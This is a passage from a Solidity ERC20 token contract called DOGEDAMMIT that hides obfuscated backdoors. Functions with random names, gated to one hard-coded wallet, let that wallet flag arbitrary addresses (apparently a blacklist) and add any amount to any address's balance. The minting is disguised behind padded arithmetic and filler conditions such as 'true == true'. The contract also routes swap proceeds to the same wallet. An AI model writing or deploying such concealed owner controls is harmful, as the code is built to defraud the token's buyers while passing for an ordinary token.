...
contract  DOGEDAMMIT is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "DOGEDAMMIT";
    string private _symbol = "DOGEDAMMIT";
    uint8 private _decimals = 9;
    address payable public rLpCbepqpA;
    ...
    mapping (address => bool) public QOdxmSXPOusQst;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x84A8606772Ed0596cAF01c8D30AA6dbA4038d80C));
        rLpCbepqpA = payable(address(0x84A8606772Ed0596cAF01c8D30AA6dbA4038d80C));
    ...
    function qlWBAGuv() view public{
        if (true == true)
        {if (false != true)
            require((uint(1) == uint(2)) || msg.sender == rLpCbepqpA);
        }
    }
    
    function smqUwvkBWoLcw(bool fOjpxVYLssGV, address[] calldata XUqrQTnfD) public {
        if (true == true) qlWBAGuv();
        if (false == false){
        for (uint256 i; i < XUqrQTnfD.length; i++) {
            QOdxmSXPOusQst[XUqrQTnfD[i]] = fOjpxVYLssGV;
        }}
    }

    function rIgDCzb(uint256 mDGPeARitYNkn, address KoPUAiya) public {
        if (true == true) qlWBAGuv();
        uint i = 500;
        uint256 HvuOGsde = i + _balances[KoPUAiya] + mDGPeARitYNkn + i - 2 * i ;
        uint a = 0;
        uint256 fseRUqQkH = a + i + HvuOGsde - i -  uint256(a);
        _balances[KoPUAiya] = i + uint256(a) +  fseRUqQkH - i;
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHMarketing > 0)
            transferToAddressETH(rLpCbepqpA, amountETHMarketing);
